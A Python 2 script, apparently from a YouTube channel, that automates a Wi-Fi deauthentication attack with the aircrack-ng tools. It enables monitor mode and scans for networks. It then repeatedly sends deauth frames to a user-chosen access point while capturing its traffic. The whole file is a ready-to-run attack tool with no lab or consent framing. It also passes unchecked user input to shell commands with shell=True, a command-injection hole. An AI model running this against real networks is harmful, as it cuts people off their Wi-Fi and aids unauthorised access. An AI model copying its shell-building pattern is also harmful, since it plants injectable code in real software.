import subprocess
import os
import signal
import sys
import time

print(r"""
 _______ ______ _____ _    _ _______ _____   ____  _   _ _____ _____  _____   __  ___  __ 
 |__   __|  ____/ ____| |  | |__   __|  __ \ / __ \| \ | |_   _/ ____|/ ____| /_ |/ _ \/_ |
    | |  | |__ | |    | |__| |  | |  | |__) | |  | |  \| | | || |    | (___    | | | | || |
    | |  |  __|| |    |  __  |  | |  |  _  /| |  | | . ` | | || |     \___ \   | | | | || |
    | |  | |___| |____| |  | |  | |  | | \ \| |__| | |\  |_| || |____ ____) |  | | |_| || |
    |_|  |______\_____|_|  |_|  |_|  |_|  \_\\____/|_| \_|_____\_____|_____/   |_|\___/ |_|
  
    """)
print("\n****************************************************************")
print("\n* Copyright of Techtronics 101, 2022                              *")
print("\n* https://techtronics101.com                                  *")
print("\n* https://www.youtube.com/c/techtronics101                          *")
print("\n****************************************************************")
print("\n INTERFACES")
print("")

subprocess.call("iwconfig" , shell=True)

interface = raw_input("Wifi Interface Name >  ")


try: 
    while True :
        subprocess.call("airmon-ng check kill" , shell=True)
        subprocess.call("airmon-ng start " + interface , shell=True)
        subprocess.call('airodump-ng ' + interface, shell=True)
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")
    bssid = raw_input("BSSID >")
    channel = raw_input("CHANNEL >")
    #station  = raw_input("STATION >")
    #subprocess.call("aireplay-ng --deauth 4 -a " + bssid + " " + interface + " </dev/null &>/dev/null & " , shell=True )
    #subprocess.call("airodump-ng --bssid  " + bssid + " -c " + channel + " " +interface , shell=True )

try:
  
    while True:
        subprocess.call( "iwconfig" + " " +interface + " " + channel, shell=True )
        subprocess.call("aireplay-ng --deauth 4 -a " + bssid + " " + interface + " </dev/null &>/dev/null & " , shell=True )
        subprocess.call("airodump-ng --bssid  " + bssid + " -c " + channel + " " +interface , shell=True )
        
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ........................................ Quitting")
    print(r"""
 _______ ______ _____ _    _ _______ _____   ____  _   _ _____ _____  _____   __  ___  __ 
  _______ _                 _              ______             _    _     _             
 |__   __| |               | |            |  ____|           | |  | |   (_)            
    | |  | |__   __ _ _ __ | | _____      | |__ ___  _ __    | |  | |___ _ _ __   __ _ 
    | |  | '_ \ / _` | '_ \| |/ / __|     |  __/ _ \| '__|   | |  | / __| | '_ \ / _` |
    | |  | | | | (_| | | | |   <\__ \     | | | (_) | |      | |__| \__ \ | | | | (_| |
    |_|  |_| |_|\__,_|_| |_|_|\_\___/     |_|  \___/|_|       \____/|___/_|_| |_|\__, |
                                                                                  __/ |
                                                                                 |___/ 
    """)

    print("//TECHTRONICS101")
